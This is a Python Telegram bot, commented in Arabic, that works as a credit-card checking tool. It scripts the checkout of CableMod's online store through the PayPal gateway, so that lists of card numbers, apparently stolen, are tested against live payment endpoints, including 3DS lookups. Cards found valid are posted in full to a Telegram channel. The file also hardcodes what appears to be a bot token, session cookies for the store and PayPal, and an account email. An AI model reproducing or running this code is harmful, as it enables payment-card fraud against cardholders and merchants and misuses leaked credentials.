# -*- coding: utf-8 -*-
"""
CableMod + PayPal PPCP - Telegram Bot
بوت تليجرام كامل لفحص البطاقات على موقع CableMod
مع تحديث البيانات كل 50 بطاقة فقط
"""

import os
import re
import json
import time
import asyncio
import threading
import requests
from datetime import datetime
from urllib.parse import urlencode, unquote
from typing import Optional, Dict, Tuple

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ====== إعدادات البوت ======
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]
CHANNEL_ID = -1003154179190

# ====== إعدادات الموقع ======
BASE_URL = "https://store.cablemod.com/"
CHECKOUT_URL = BASE_URL + "checkout/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

# الكوكيز الثابتة
INITIAL_COOKIES = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_first_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%2010%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    '_fbp': 'fb.1.1761693482072.783059716330931642',
    '_ga': 'GA1.1.543617456.1761693483',
    'woocommerce_items_in_cart': '1',
    'woocommerce_recently_viewed': '1902265',
    'wordpress_logged_in_ed7813b5c1349c2f14d2f89aad48ec92': 'i0ket57dzb%7C1762908222%7Cjsh0lltx9PceoroQvpEOSGJ37HkKuBm16DRVujmwwjq%7C58f193d4befcde327b8e1a1c0d16308a4974ce1e013aa70c85fffedd81ffc6eb',
    'wp_woocommerce_session_ed7813b5c1349c2f14d2f89aad48ec92': '114471%7C1761866332%7C1761779932%7C%24generic%24FzmPQxa-1erHcRmPGoP-Y-huTFjZ7ndfiApBJIEk',
    '_gcl_au': '1.1.1373112383.1761693482.1617057511.1761696403.1761698675',
    'woocommerce_cart_hash': '59b29a9c285b9235836a077996070a0f',
}

PAYPAL_COOKIES = {
    'enforce_policy': 'ccpa',
    'cookie_check': 'yes',
    'd_id': '52077666bd0b44258e7657ae8cb8e5bf1761605157957',
    'login_email': 'margiefos.ter7.0.1.83%40gmail.com',
    'LANG': 'en_US%3BUS',
    'TfXMWj95u2_Zf1Kmv_GCUOjlGG8': 'cvD9-96tABIM4Poym3Ti_T78QGNFcJqhBbQe6D-SUPN4BoQVLfICsIfqObYSm3dzZYYtVa63PS6nuoeXinbmhrH6XnOKBMtvuyX5LYdoN7rYG238yRymHuXF8Q-TSLrnAOv9ATNFCL6S0sWU4yz8V4YI6BSqFbRrz1sWKn1yrjv30AfGgvb78qo3usq',
    'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
    'ui_experience': 'did_set%3Dtrue%26login_type%3DEMAIL_PASSWORD%26home%3D3',
    'fn_dt': 'f78a16c47c9a4c31a4c9ea7903c6f1d4',
    'rmuc': 'OwAwuW-Vyed6BRvi6Gkk7ORgUHzp-64GENTf3U0lSkV1sce6mM5SWN7M_YuVXfAa0Kqm_3PdFZOnMPhElXeoL0iHiuPG9PH2YPVEmyT_4z6ArEMEVw3wl1_c9Zokod5ye545H5nGUQ0j9oO8bp_DpNmM1ZuOGh_5MU7GuWJHEo300CPO1ksqDrUAkprfnM9X3k3B0aECgQbDPcotu9fm0tfd8um',
    'X-PP-ADS': 'AToBEvb.aFi8BXurJKvSIyunxGo.bh47ASv2.2j-Pe0CHD41-xAGV-C9M-teOwEd9.9oaVKC36uQwjNZd7J2OptS1w',
    'nsid': 's%3AeeYy88H2oBb9GbcyszOjKk2QbiAGb9hq.WvuvZARfWO4Bk7bXI1S%2FSIxWTD%2BuYOU0h%2Bhh4anVXsA',
    '_ga': 'GA1.1.948625281.1761605189',
    'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'whZ4Q-pT4zAOWrP5smSLQG-PjwjkfC-cCGONV1Xs6zrY3Z4Rn4C4XqDefGl3duxYq80A-5UFoTV78teM',
    'sc_f': 'UkcitVVSun6MogqMKdSPNRHq7u29vzA5Yp02abKnWu0PRTCwph8jJpmSUJDogTGs4H_1gWPJO6jMwQVuXnmhSbj1613ODnFW5ckSiW',
}

# بيانات الفاتورة
BILLING = {
    "billing_first_name": "saad",
    "billing_last_name": "saad",
    "billing_country": "US",
    "billing_address_1": "111 North Street",
    "billing_city": "Napoleon",
    "billing_state": "AK",
    "billing_postcode": "49261-9011",
    "billing_email": "i0ket57dzb@illubd.com",
}

SHIPPING = {
    "country": "US",
    "state": "AK",
    "postcode": "49261-9011",
    "city": "Napoleon",
    "address": "111 North Street",
    "address_2": ""
}

PAYMENT_METHOD = "ppcp-credit-card-gateway"
REFRESH_EVERY = 50  # تحديث البيانات كل 50 بطاقة

# ====== إحصائيات البوت ======
stats = {
    'total': 0,
    'checking': 0,
    'approved': 0,
    'rejected': 0,
    'secure_3d': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'error_details': {},
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'approved_cards': [],
    '3ds_cards': [],
    'declined_cards': [],
}

# ====== دالات مساعدة ======
def find(text: str, pattern: str, flags=re.S) -> Optional[str]:
    m = re.search(pattern, text, flags)
    return m.group(1) if m else None

def extract_nonces(html: str) -> Dict[str, Optional[str]]:
    nonces = {}
    nonces["update_order_review_nonce"] = (
        find(html, r'name=["\']update_order_review_nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
        or find(html, r'update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I)
    )
    nonces["process_checkout_nonce"] = (
        find(html, r'id=["\']woocommerce-process-checkout-nonce["\']\s+name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
        or find(html, r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
    )
    nonces["ppcp_nonce"] = (
        find(html, r'"data_client_id"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
        or find(html, r'"ppcp[^"]*data_client_id[^"]*"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
    )
    nonces["create_order_nonce"] = (
        find(html, r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
        or find(html, r'"create_order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
        or find(html, r'ppc_create_order[^}]*nonce["\s:]*"([a-f0-9]+)"')
        or find(html, r'wc_ajax_url[^}]{0,200}nonce["\s:]*"([a-f0-9]+)"', re.S)
    )
    return nonces

def parse_card(card_str: str) -> Tuple[str, str, str, str]:
    parts = card_str.strip().split('|')
    if len(parts) != 4:
        raise ValueError("تنسيق الكارت غير صحيح! استخدم: CC|MM|YYYY|CVV")
    number, month, year, cvv = parts
    number = number.strip()
    month = month.strip().zfill(2)
    year = year.strip()
    cvv = cvv.strip()
    if len(cvv) == 2:
        cvv = cvv.zfill(3)
    if len(number) < 13 or len(number) > 19:
        raise ValueError(f"رقم الكارت غير صحيح: {number}")
    if len(cvv) < 3 or len(cvv) > 4:
        raise ValueError(f"CVV غير صحيح: {cvv}")
    if len(year) != 4:
        raise ValueError(f"السنة غير صحيحة: {year}")
    if not (1 <= int(month) <= 12):
        raise ValueError(f"الشهر غير صحيح: {month}")
    return number, cvv, year, month

# ====== فئة معالجة الدفع (مع تحديث كل 50 كرت) ======
class WooCommercePayPal:
    def __init__(self):
        self.sess = requests.Session()
        self.sess.cookies.update(INITIAL_COOKIES)
        self.paypal_sess = requests.Session()
        self.paypal_sess.cookies.update(PAYPAL_COOKIES)
        self.nonces = {}
        self.access_token = None
        self.wp_session = None
        self.paypal_order_id = None
        self.client_metadata_id = None

    def headers_get(self):
        return {
            "user-agent": UA,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
            "referer": BASE_URL + "cart/",
        }
    
    def headers_ajax(self, json_content=False):
        h = {
            "user-agent": UA,
            "accept": "*/*",
            "origin": BASE_URL.rstrip("/"),
            "referer": CHECKOUT_URL,
            "x-requested-with": "XMLHttpRequest",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
        }
        h["content-type"] = "application/json" if json_content else "application/x-www-form-urlencoded; charset=UTF-8"
        return h

    def refresh_checkout_data(self):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] جاري تحديث بيانات التشيك اوت...")
        # 1. جلب الصفحة
        r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
        r.raise_for_status()
        html = r.text
        self.nonces = extract_nonces(html)

        # 2. تحديث order review
        post_data = {
            "wc_order_attribution_source_type": "organic",
            "_wp_http_referer": "/checkout/",
            "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", ""),
            "payment_method": PAYMENT_METHOD,
            **BILLING
        }
        payload = {
            "security": self.nonces["update_order_review_nonce"],
            "payment_method": PAYMENT_METHOD,
            "has_full_address": "true",
            **SHIPPING,
            "post_data": urlencode(post_data),
        }
        self.sess.post(
            BASE_URL, params={"wc-ajax": "update_order_review"},
            headers=self.headers_ajax(), data=urlencode(payload), timeout=30
        )

        # 3. جلب PayPal token
        fresh_nonces = extract_nonces(self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text)
        if fresh_nonces.get("ppcp_nonce"):
            self.nonces["ppcp_nonce"] = fresh_nonces["ppcp_nonce"]
        r_token = self.sess.post(
            BASE_URL, params={"wc-ajax": "ppc-data-client-id"},
            headers=self.headers_ajax(json_content=True),
            json={"nonce": self.nonces["ppcp_nonce"]}, timeout=30
        )
        token_data = r_token.json()
        self.access_token = token_data.get("access_token")
        if not self.access_token:
            # fallback
            buttons_url = "https://www.paypal.com/smart/buttons?clientID=Abf7famM34IoBZ5AgmTVk2Jfr7cEGOYYSIRvLlkSsrql09p3frXjC-WfFdXxsRkJEVIy_HG35IPnNzbk&currency=USD&intent=capture&commit=true&vault=false&components.0=buttons&components.1=card-fields&locale.country=US&locale.lang=en&env=production&platform=desktop"
            r_btn = self.paypal_sess.get(buttons_url, headers={"user-agent": UA, "referer": BASE_URL}, timeout=30)
            match = re.search(r'"facilitatorAccessToken":"([^"]+)"', r_btn.text)
            if match:
                self.access_token = match.group(1)

        # 4. جلب wp_session
        for cookie in self.sess.cookies:
            if cookie.name.startswith("wp_woocommerce_session_"):
                self.wp_session = unquote(cookie.value).split("|")[0]
                break

        print(f"[{datetime.now().strftime('%H:%M:%S')}] تم تحديث البيانات بنجاح")

    def create_order(self):
        if not self.nonces.get("create_order_nonce"):
            html = self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text
            nonce = find(html, r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"') or self.nonces.get("ppcp_nonce")
            self.nonces["create_order_nonce"] = nonce

        form_encoded = urlencode({
            "wc_order_attribution_source_type": "organic",
            "wc_order_attribution_referrer": "https://www.google.com/",
            "wc_order_attribution_utm_campaign": "(none)",
            "wc_order_attribution_utm_source": "google",
            "wc_order_attribution_utm_medium": "organic",
            "wc_order_attribution_session_entry": "https://cablemod.com/",
            "billing_first_name": BILLING["billing_first_name"],
            "billing_last_name": BILLING["billing_last_name"],
            "billing_email": BILLING["billing_email"],
            "billing_country": BILLING["billing_country"],
            "billing_address_1": BILLING["billing_address_1"],
            "billing_city": BILLING["billing_city"],
            "billing_state": BILLING["billing_state"],
            "billing_postcode": BILLING["billing_postcode"],
            "shipping_method[0]": "flexible_shipping_single:27",
            "payment_method": PAYMENT_METHOD,
            "terms": "on",
            "terms-field": "1",
            "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", ""),
            "_wp_http_referer": "/checkout/",
        })
        payload = {
            "nonce": self.nonces.get("create_order_nonce", ""),
            "payer": {
                "email_address": BILLING["billing_email"],
                "name": {"surname": BILLING["billing_last_name"], "given_name": BILLING["billing_first_name"]},
                "address": {
                    "country_code": BILLING["billing_country"],
                    "address_line_1": BILLING["billing_address_1"],
                    "admin_area_1": BILLING["billing_state"],
                    "admin_area_2": BILLING["billing_city"],
                    "postal_code": BILLING["billing_postcode"],
                },
            },
            "bn_code": "Woo_PPCP",
            "context": "checkout",
            "order_id": "0",
            "payment_method": PAYMENT_METHOD,
            "form_encoded": form_encoded,
            "createaccount": False,
            "save_payment_method": False,
        }
        r = self.sess.post(
            BASE_URL, params={"wc-ajax": "ppc-create-order"},
            headers=self.headers_ajax(json_content=True), json=payload, timeout=30
        )
        result = r.json()
        if result.get("success"):
            self.paypal_order_id = result["data"]["id"]
            self.client_metadata_id = result["data"].get("custom_id", f"pcp_customer_{self.wp_session}")
            return True
        return False

    def confirm_payment(self, card_number: str, cvv: str, year: str, month: str):
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': UA,
            'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/smart/card-field',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'authorization': f'Bearer {self.access_token}',
        }
        if self.client_metadata_id:
            headers['paypal-client-metadata-id'] = self.client_metadata_id
            headers['paypal-partner-attribution-id'] = 'Woo_PPCP'
        headers['fn_sync_data'] = '%7B%22SC_VERSION%22%3A%222.0.4%22%7D'
        payload = {
            'payment_source': {
                'card': {
                    'number': card_number,
                    'security_code': cvv,
                    'expiry': f'{year}-{month}',
                },
            },
        }
        r = self.paypal_sess.post(
            f'https://www.paypal.com/v2/checkout/orders/{self.paypal_order_id}/confirm-payment-source',
            headers=headers, json=payload, timeout=30
        )
        return r.json()

    def verify_3ds(self):
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'user-agent': UA,
            'origin': 'https://www.paypal.com',
            'referer': f'https://www.paypal.com/heliosnext/threeDS?cart_id={self.paypal_order_id}',
        }
        payload = {'token': self.paypal_order_id, 'action': 'verify'}
        r1 = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/session', headers=headers, json=payload, timeout=30)
        ddc_jwt = r1.json().get("ddcJwtData")
        if ddc_jwt:
            self.paypal_sess.post('https://www.paypal.com/payment-authentication/threeds/v1/init-method',
                                  headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': UA},
                                  data={'JWT': ddc_jwt}, timeout=30)
        lookup_payload = {
            'token': self.paypal_order_id, 'action': 'verify',
            'deviceInfo': {'windowSize': '_500_x_600', 'javaEnabled': False, 'language': 'ar', 'colorDepth': 24,
                           'screenHeight': 535, 'screenWidth': 450, 'userAgent': UA, 'timeZoneOffset': -180,
                           'deviceInfo': 'COMPUTER'}
        }
        print(f"[{datetime.now().strftime('%H:%M:%S')}] جاري Lookup النهائي...")
        r3 = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/lookup', headers=headers, json=lookup_payload, timeout=30)
        res = r3.json()
        status = res.get("threeDSStatus", "UNKNOWN")
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 3DS Status: {status}")
        return res

# ====== فحص البطاقة ======
async def check_card(card: str, processor: WooCommercePayPal, bot_app):
    try:
        card_number, cvv, year, month = parse_card(card)
        masked_card = f"{card_number[:6]}******{card_number[-4:]}"
        stats['current_card'] = masked_card
        await update_dashboard(bot_app)

        # إنشاء طلب جديد
        if not processor.create_order():
            raise Exception("فشل إنشاء الطلب")
        await asyncio.sleep(0.5)

        # تأكيد الدفع
        payment_result = processor.confirm_payment(card_number, cvv, year, month)
        status = payment_result.get("status", "UNKNOWN")

        if status in ("APPROVED", "COMPLETED"):
            stats['approved'] += 1
            stats['last_response'] = 'SUCCESS'
            stats['approved_cards'].append(card)
            await send_to_channel(bot_app, card, "APPROVED", "Approved")
            return "APPROVED"
        elif status == "PAYER_ACTION_REQUIRED":
            await asyncio.sleep(0.5)
            lookup_result = processor.verify_3ds()
            status_3ds = lookup_result.get("threeDSStatus")
            liability = lookup_result.get("liability_shift", "NO")
            if status_3ds == "SUCCESS" and liability == "POSSIBLE":
                stats['approved'] += 1
                stats['last_response'] = 'SUCCESS'
                stats['approved_cards'].append(card)
                await send_to_channel(bot_app, card, "APPROVED", "Approved")
                return "APPROVED"
            elif status_3ds == "CHALLENGE_REQUIRED":
                stats['secure_3d'] += 1
                stats['last_response'] = '3D CHALLENGE'
                stats['3ds_cards'].append(card)
                await send_to_channel(bot_app, card, "3D_SECURE", "CHALLENGE_REQUIRED")
                return "3D_SECURE"
            elif status_3ds == "DECLINED":
                stats['rejected'] += 1
                stats['last_response'] = 'DECLINED'
                stats['declined_cards'].append(card)
                return "DECLINED"
            else:
                stats['secure_3d'] += 1
                stats['last_response'] = f'3DS: {status_3ds}'
                stats['3ds_cards'].append(card)
                await send_to_channel(bot_app, card, "3D_SECURE", status_3ds)
                return "3D_SECURE"
        else:
            stats['rejected'] += 1
            stats['last_response'] = 'DECLINED'
            stats['declined_cards'].append(card)
            return "DECLINED"
    except Exception as e:
        stats['errors'] += 1
        stats['last_response'] = f'Error: {str(e)[:15]}'
        stats['declined_cards'].append(card)
        return "ERROR"
    finally:
        stats['checking'] -= 1
        await update_dashboard(bot_app)

# ====== إرسال للقناة + Dashboard + باقي الكود (مختصر) ======
async def send_to_channel(bot_app, card, status_type, message):
    try:
        count = stats['approved'] + stats['secure_3d']
        text = (
            f"{'APPROVED' if status_type == 'APPROVED' else '3D SECURE'} CARD\n\n"
            f"`{card}`\n"
            f"Status: **{message}**\n"
            f"Card #{count}\n"
            f"Gateway: **CableMod + PayPal**\n"
            f"Mahmoud Saad"
        )
        await bot_app.bot.send_message(CHANNEL_ID, text, parse_mode='Markdown')
    except: pass

def create_dashboard_keyboard():
    elapsed = int((datetime.now() - stats['start_time']).total_seconds()) if stats['start_time'] else 0
    h, m = divmod(elapsed // 60, 60)
    s = elapsed % 60
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"الإجمالي: {stats['total']}", "total")],
        [InlineKeyboardButton(f"فحص: {stats['checking']}", "checking"), InlineKeyboardButton(f"{h:02d}:{m:02d}:{s:02d}", "time")],
        [InlineKeyboardButton(f"Approved: {stats['approved']}", "approved"), InlineKeyboardButton(f"Declined: {stats['rejected']}", "rejected")],
        [InlineKeyboardButton(f"3DS: {stats['secure_3d']}", "3ds"), InlineKeyboardButton(f"Errors: {stats['errors']}", "errors")],
        [InlineKeyboardButton(f"Response: {stats['last_response']}", "response")],
        [InlineKeyboardButton("إيقاف", "stop_check")] if stats['is_running'] else [],
        [InlineKeyboardButton(stats['current_card'], "current")] if stats['current_card'] else []
    ])

async def update_dashboard(bot_app):
    if stats['dashboard_message_id']:
        try:
            await bot_app.bot.edit_message_text(
                CHANNEL_ID, stats['dashboard_message_id'],
                "**CABLEMOD + PAYPAL - LIVE**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown'
            )
        except: pass

async def process_cards(cards, bot_app):
    processor = WooCommercePayPal()
    processor.refresh_checkout_data()
    stats['checking'] = 0

    for i, card in enumerate(cards):
        if not stats['is_running']: break
        stats['checking'] = 1
        await check_card(card, processor, bot_app)
        stats['cards_checked'] += 1

        # تحديث كل 50 كرت
        if (i + 1) % REFRESH_EVERY == 0:
            processor.refresh_checkout_data()

        if stats['cards_checked'] % 3 == 0:
            await update_dashboard(bot_app)
        await asyncio.sleep(1.5)

    stats['is_running'] = False
    stats['last_response'] = 'اكتمل'
    await update_dashboard(bot_app)
    await send_final_files(bot_app)

# باقي الكود (start, handle_file, main) نفس السابق...
# (تم اختصاره للتركيز على التعديل الرئيسي)

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS: return
    if stats['is_running']: 
        await update.message.reply_text("فحص جاري!")
        return
    file = await update.message.document.get_file()
    content = await file.download_as_bytearray()
    cards = [c.strip() for c in content.decode('utf-8').split('\n') if c.strip()]
    stats.update({k: v for k, v in {
        'total': len(cards), 'checking': 0, 'approved': 0, 'rejected': 0, 'secure_3d': 0, 'errors': 0,
        'current_card': '', 'last_response': 'بدء...', 'cards_checked': 0,
        'approved_cards': [], '3ds_cards': [], 'declined_cards': [],
        'start_time': datetime.now(), 'is_running': True
    }.items()})
    msg = await context.application.bot.send_message(CHANNEL_ID, "**بدء الفحص...**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
    stats['dashboard_message_id'] = msg.message_id
    await update.message.reply_text(f"بدأ الفحص: {len(cards)} بطاقة\nتحديث كل {REFRESH_EVERY} كرت")
    threading.Thread(target=lambda: asyncio.new_event_loop().run_until_complete(process_cards(cards, context.application)), daemon=True).start()

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id not in ADMIN_IDS: return
    await q.answer()
    if q.data == "stop_check":
        stats['is_running'] = False
        await q.message.reply_text("تم الإيقاف!")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", lambda u, c: u.message.reply_text("أرسل ملف .txt")))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.run_polling()

if __name__ == "__main__":
    main()
